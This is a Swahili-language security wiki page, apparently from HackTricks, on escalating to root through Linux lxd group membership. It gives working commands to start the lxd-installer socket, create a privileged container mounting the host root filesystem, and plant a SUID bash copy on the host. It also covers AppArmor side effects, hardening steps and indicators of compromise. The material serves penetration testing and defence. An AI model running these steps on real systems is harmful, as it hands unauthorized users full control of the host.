# lxd/lxc Group - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

Uanachama katika kundi la usimamizi wa LXD la host (kwa kawaida _**lxd**_) unaweza kutoa njia ya kupata root kwa kuruhusu udhibiti kamili wa daemon.<sup>[[1]](#references)</sup> Hili ni tatizo lilelile la mipaka ya uaminifu lililoelezwa kuhusu [runtime control sockets](../../containers-namespaces/container-security/runtime-api-and-daemon-exposure.md) na [writable host mounts](../../containers-namespaces/container-security/sensitive-host-mounts.md): ufikiaji wa management API unaweza kutosha hata kama mchakato wa sasa hauko ndani ya container tayari.<sup>[[1]](#references)</sup>

## Ubuntu `lxd-installer` socket activation

Usidhani kuwa uanachama wa `lxd` hauna madhara kwa sababu tu LXD snap haipo. Kwenye Ubuntu Server 24.04 na matoleo ya baadaye, kifurushi cha `lxd-installer` kilichosakinishwa awali huweka `/run/lxd-installer.socket` kama `root:lxd` yenye mode `0660`. Muunganisho huwasha `lxd-installer@.service` kama root, ambayo husakinisha LXD snap bila nenosiri la sudo au idhini ya polkit; baadhi ya matoleo ya wrapper pia huacha ombi la uthibitisho pale standard input si TTY.<sup>[[10]](#references)[[11]](#references)</sup>

Kagua uanachama wa akaunti na huduma inayowashwa na socket:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
id -nG
getent group lxd
stat -c '%A %U:%G %n' /run/lxd-installer.socket
systemctl cat lxd-installer.socket lxd-installer@.service
```

Jaribio lililoidhinishwa la kikundi cha `lxd` linaweza kuwasha installer kupitia wrapper ya kawaida ya `lxc` au kwa kuunganisha moja kwa moja kwenye socket. Njia ya pili inaonyesha kuwa ACL ya Unix-socket, badala ya kidokezo cha wrapper, ndiyo mpaka halisi wa uidhinishaji:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/run/lxd-installer.socket"); s.send(b"x"); s.recv(1)'
lxc version
```

Mara daemon inapopatikana, endelea na mbinu za privileged-container zilizo hapa chini.<sup>[[10]](#references)[[11]](#references)</sup>

## Exploiting bila intaneti

### Mbinu ya 1

Unaweza kupakua image ya Alpine ya kutumia na LXD kutoka kwenye hazina inayoaminika.
Seva ya image ya LXD ya Canonical huchapisha builds za kila siku: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Pakua tu **lxd.tar.xz** na **rootfs.squashfs** kutoka kwenye build mpya zaidi (jina la saraka ni tarehe).<sup>[[8]](#references)</sup>

Vinginevyo, unaweza kusakinisha distrobuilder kwenye mashine yako kwa kufuata [maelekezo ya mradi](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage    

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```

Pakia **incus.tar.xz** (**lxd.tar.xz** ikiwa ulipakua kutoka kwa seva ya picha ya Canonical) na **rootfs.squashfs**, kisha ingiza picha na uunde kontena.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

> [!CAUTION]
> Ukipata hitilafu hii _**Error: No storage pool found. Please create a new storage pool**_\
> Endesha **`lxd init`**, sanidi storage pool chaguomsingi, kisha **rudia** sehemu ya awali ya amri.<sup>[[2]](#references)</sup>

Mwishowe, anzisha container na ufungue root shell kwenye mfumo wa faili wa host:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

Kwa kuwa UID 0 katika instance hii yenye ruhusa za juu haijapangiwa upya, inaweza kuunda payload ya SUID inayomilikiwa na host kupitia root ya host iliyowekwa mount. Hii inakamilisha pivot kutoka container kwenda host badala ya kumwacha operator kwenye shell ya container:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
# From the host, write the payload through the privileged container
lxc exec privesc -- /bin/sh -c 'cp /mnt/root/bin/bash /mnt/root/rootbash && chmod 4755 /mnt/root/rootbash'

# Execute on the host; -p prevents bash from dropping the SUID-derived EUID
/rootbash -p
id
```

Weka payload kwenye mfumo wa faili unaoheshimu SUID. `/tmp` tofauti mara nyingi huwekwa `nosuid` na huenda isionekane chini ya bind isiyorudiarudia ya `/` ya host, kwa hivyo njia kama `/rootbash` kwenye mfumo wa faili wa root wa host ni ya kuaminika zaidi kwa uthibitisho huu.<sup>[[10]](#references)[[11]](#references)</sup>

### Method 2

Tengeneza image ya Alpine na uiwashe kwa flag `security.privileged=true`, ambayo huunganisha root ya container na root ya host; kisha kuweka `/` kama mount huonyesha mfumo wa faili wa host ndani ya container.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

## Athari ya AppArmor kwa host nzima

Kuanzisha snap ya LXD kunaweza pia kuandika `/run/sysctl.d/zz-lxd.conf` na kuweka `kernel.apparmor_restrict_unprivileged_userns` na `kernel.apparmor_restrict_unprivileged_unconfined` zote kuwa `0`. Hili hudhoofisha vizuizi vya Ubuntu kwa user namespace zisizo na privileged kwa kila mtumiaji wa ndani, kwa hivyo rekodi thamani kabla na baada ya kuwasha LXD unapokagua host.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
cat /run/sysctl.d/zz-lxd.conf 2>/dev/null
sysctl kernel.apparmor_restrict_unprivileged_userns \
       kernel.apparmor_restrict_unprivileged_unconfined
```

## Ukaguzi na uimarishaji wa usalama

Chukulia uanachama wa `lxd` kama ruhusa ya root. Kumwondoa mwanachama asiyehitajika huanza kutumika kwa vipindi vipya vya kuingia; kufuta `lxd-installer` au kufunika socket yake huondoa tu njia ya usakinishaji inapohitajika, na **hakumwekei kizuizi** mtumiaji ambaye tayari anaweza kufikia daemon ya LXD iliyosakinishwa.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
getent group lxd
sudo gpasswd -d <user> lxd

# Only if on-demand LXD installation is not required
sudo systemctl mask --now lxd-installer.socket
# or: sudo apt purge lxd-installer
```

Viashiria muhimu vya kuashiria mfumo umeathiriwa ni pamoja na LXD instances zenye `security.privileged=true`, disk devices ambazo `source` yake ni `/`, miunganisho isiyotarajiwa kwa `/run/lxd-installer.socket`, faili mpya za SUID, na mabadiliko ya AppArmor sysctls zilizo hapo juu kutoka `1` hadi `0`.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
lxc list
lxc config show <instance> --expanded
find / -xdev -type f -perm -4000 2>/dev/null
```

## References

- [1] [Jinsi ya kuimarisha usalama wa LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [Kontena za LXD na mashine pepe](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Jinsi ya kunakili na kuingiza images](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Jinsi ya kuunda images kwa kutumia distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Ufafanuzi wa image ya Alpine](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [Hati ya build ya lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [Seva ya image za LXD](https://images.lxd.canonical.com/)
- [9] [Aina: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
- [10] [Ripoti ya STAR Labs kuhusu kupandisha mamlaka kupitia kundi la LXD na PoC](https://github.com/star-sg/lxd-group-privesc-report)
- [11] [Divai ya Zamani kwenye Chupa Mpya: Root kupitia kundi la LXD ya Muongo Mmoja Imepewa Silaha Tena](https://starlabs.sg/blog/2026/06-old-wine-in-a-new-bottle-a-decade-old-lxd-group-root-re-armed)
{{#include ../../../banners/hacktricks-training.md}}
